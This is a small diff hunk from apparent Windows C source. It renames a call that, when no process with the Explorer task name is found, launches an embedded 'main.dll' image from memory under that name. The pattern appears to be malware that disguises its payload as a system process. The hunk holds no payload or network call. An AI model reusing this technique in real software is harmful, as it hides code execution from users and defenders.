@@ -77,7 +77,7 @@ int runcmd(char * cmd) {
 		{
 			if (__findProcessFuncName(EXPLORER_TASKNAME) == FALSE)
 			{
-				__kCreateProcess(MAIN_DLL_SOURCE_BASE, imagesize, (char*)"main.dll", (char*)EXPLORER_TASKNAME, 3, 0);
+				__ipiCreateProcess(MAIN_DLL_SOURCE_BASE, imagesize, (char*)"main.dll", (char*)EXPLORER_TASKNAME, 3, 0);
 			}
 
 			__asm {
